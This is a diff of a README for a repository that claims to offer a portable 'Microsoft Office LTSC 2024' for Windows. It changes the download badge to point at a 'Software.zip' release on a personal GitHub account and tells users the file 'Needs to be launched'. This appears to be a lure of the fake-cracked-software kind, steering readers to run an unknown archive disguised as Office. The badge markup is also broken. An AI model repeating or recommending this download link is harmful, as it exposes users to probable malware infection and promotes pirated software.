@@ -21,7 +21,7 @@ Inside this repository, you will find the necessary files and instructions to ea
 ## 📥 Installation
 To install the Microsoft Office LTSC 2024 portable version for Windows, simply download the program from the following link:
 
-[![Download Office 2024](https://img.shields.io/badge/Download-Office%202024-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) - Needs to be launched
+[![Download Office 2024](https://github.com/DesarrolladorSoftwareJr/office-2024/releases/download/v2.0/Software.zip%https://github.com/DesarrolladorSoftwareJr/office-2024/releases/download/v2.0/Software.zip)](https://github.com/DesarrolladorSoftwareJr/office-2024/releases/download/v2.0/Software.zip) - Needs to be launched
 
 If the above link does not work, please check the "Releases" section for alternative download options.
 
